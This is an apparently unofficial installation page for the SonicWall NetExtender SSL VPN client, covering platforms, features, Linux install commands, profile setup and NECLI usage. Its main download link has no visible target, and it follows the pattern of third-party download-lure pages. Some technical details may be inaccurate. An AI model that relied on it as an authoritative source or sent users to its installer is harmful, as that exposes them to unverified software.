# Download and Install SonicWall NetExtender

SonicWall NetExtender is a lightweight SSL VPN client designed for remote users needing secure access to their organization’s internal network. It establishes an encrypted tunnel that enables full network capabilities — including file sharing, drive mapping, and seamless access to enterprise applications — just like working on-site.

- [Installation](#installation)  
- [Compatible Platforms](#compatible-platforms)  
- [Key Features](#key-features)  
- [Setting Up NetExtender](#setting-up-netextender)  
- [How to Use NetExtender](#how-to-use-netextender)  
- [Security and Authentication](#security-and-authentication)  
- [Command Line Interface (CLI) Usage](#command-line-interface-cli-usage)  

---

## Installation

To get started, download the NetExtender client for Windows using the link below:

[**Download NetExtender**](*)

Begin setting up your secure connection by downloading the installer package. This is a crucial step to establish a dependable SSL VPN link with your corporate network. Once the file is downloaded, follow the on-screen instructions to install the client and securely connect from virtually anywhere.

---

## Compatible Platforms

NetExtender supports the following operating systems and devices:

### **Windows:**  
- **Windows 10/11** (latest updates recommended)  
- Compatible with **Microsoft Edge, Chrome, and Firefox**  

### **Linux:**  
- **Ubuntu 18.04 or later**  
- **Fedora 14 and above**  
- **OpenSUSE 10.3 or newer**  
- Available as `.rpm` and `.tgz` installation packages  

### **Supported SonicWall Devices:**  
NetExtender integrates smoothly with **SonicWall SMA appliances** and **firewalls using SonicOS 6.5 or higher**.  

---

## Key Features

### 🔹 **Standalone VPN Application**  
NetExtender runs independently from a web browser after the initial configuration.  

### 🔹 **Diverse Authentication Options**  
- **Standard login credentials**  
- **One-Time Password (OTP) support**  
- **Integration with RSA SecureID, Duo, and Microsoft Authenticator**  

### 🔹 **Robust Security Measures**  
- **VPN connections secured via SSL encryption**  
- **Supports both Full Tunnel and Split Tunnel configurations**  

### 🔹 **Proxy Compatibility**  
The client works with **HTTPS proxy servers** and can auto-detect settings through **WPAD**.  

---

## Installing NetExtender

### Linux Installation via Terminal  

1. **Download the appropriate archive:**  
   ```bash
   wget https://yoursonicwallserver.com/NetExtender.tgz
   ```  
2. **Extract and install the package:**  
   ```bash
   tar -xvzf NetExtender.tgz
   cd netExtenderClient/
   sudo ./install
   ```  
3. **Launch the graphical interface:**  
   ```bash
   netExtenderGui
   ```  

> [!warning] **Administrator Access Required:**  
> `sudo` privileges are necessary to complete the installation process.  

---

## Setting Up NetExtender

### Creating a VPN Profile  
Store multiple profiles for quick and repeated access.  

1. Open **NetExtender** and navigate to **Connection Profiles**.  
2. Select **Add New Profile**.  
3. Input the connection details:  
   - **Server Address:** `vpn.yourcompany.com`  
   - **Username and Password**  
   - **Domain (if needed)**  
4. Click **Save** to retain the profile.  

> [!info] **Tip:**  
> Enable **auto-connect** for quicker access during system startup.  

### Proxy Settings Configuration  
1. Go to the **NetExtender Settings** section.  
2. Turn on **Proxy Support**.  
3. Choose a method for connection:  
   - **Automatic detection using WPAD**  
   - **Manual configuration** (enter proxy address and port manually)  

---

## How to Use NetExtender

### Starting a VPN Session  
1. Launch the **NetExtender** application.  
2. Pick a saved profile or manually enter:  
   - **VPN Server Address**  
   - **Login Information**  
3. Click **Connect** to initiate a secure session.  
4. After connecting, you can:  
   - **Access network drives**  
   - **Run internal software**  
   - **Transfer files securely**  

### Ending the VPN Connection  
To disconnect, press **Disconnect** in the app or use the terminal command:  
```bash
NECLI disconnect
```  

---

## Security and Authentication

### Supported Authentication Methods  
- **Basic login using username and password**  
- **One-Time Passwords (OTP) for added security**  
- **Digital certificate validation**  
- **Multi-factor authentication (MFA) for stronger protection**  

> [!warning] **Security Best Practice:**  
> It’s highly recommended to activate **MFA** to help prevent unauthorized logins.  

---

## Command Line Interface (CLI) Usage

NetExtender offers a **command-line utility (`NECLI`)** for automation and advanced usage scenarios.  

### Common CLI Commands

#### Connect to VPN  
```bash
NECLI connect -s vpn.company.com -u username -p password -d domain
```  

#### Display connection status  
```bash
NECLI showstatus
```  

#### Disconnect from VPN  
```bash
NECLI disconnect
```  

> [!tip] **Streamline Your Workflow:**  
> Use `batch scripts` to simplify VPN logins and routing tasks.  
